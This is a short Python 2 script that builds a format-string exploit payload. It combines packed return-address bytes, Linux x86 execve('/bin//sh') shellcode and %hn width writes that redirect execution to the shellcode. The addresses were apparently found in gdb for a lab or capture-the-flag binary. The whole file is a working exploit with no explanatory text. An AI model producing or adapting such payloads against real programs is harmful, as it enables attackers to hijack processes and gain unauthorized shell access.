import struct

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
ra_address = 0xbffff69c # in gdb with fixenv
shellcode_addr = 0xbffff5a8 # (9 bytes after the start of our string)

s = "x"
s += struct.pack("<L", ra_address)
s += struct.pack("<L", ra_address + 2)
s += shellcode
distance = 0xbfff - len(s)
s += "%{}X".format(distance)
s += "%15$hn"
distance = 0xf58e - distance - 6 # 6 for the "%15$hn"
s += "%{}X".format(distance)
s += "%14$hn"

print s
